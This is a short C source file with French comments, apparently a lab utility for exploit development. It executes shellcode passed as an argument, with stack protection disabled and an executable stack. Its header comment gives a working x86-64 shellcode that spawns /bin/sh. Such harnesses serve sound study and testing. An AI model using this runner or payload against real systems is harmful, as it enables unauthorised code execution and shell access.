//COMPILATION : gcc  wrapper/wrapper.c -o wrapper/wrapper -fno-stack-protector -z execstack -m64
//EXECUTION EXEMPLE : ./wrapper/wrapper $(python2 -c "print('\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05')")
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
  // Controle du nombre d'arguments
  if (argc < 2) {
    printf("usage : ./wrapper $(python2 -c \"print(\'SHELLCODE\')\")\n");
    return 1;
  }
  
  char *shellcode = argv[1];
  
  // Affichage de la taille du shellcode
  size_t shellcode_len = strlen(shellcode);
  printf("Shellcode size: %ld\n", shellcode_len);

  // Affichage du shellcode
  printf("Shellcode: ");
  for (size_t i = 0; i < shellcode_len; i++) {
    printf("\\x%02x", (unsigned char)shellcode[i]);
  }
  printf("\n");

  // Execution du shellcode
  printf("Executing shellcode...\n");
  int (*func)();
  func = (int (*)()) shellcode;
  (int)(*func)();

  return 0;
}
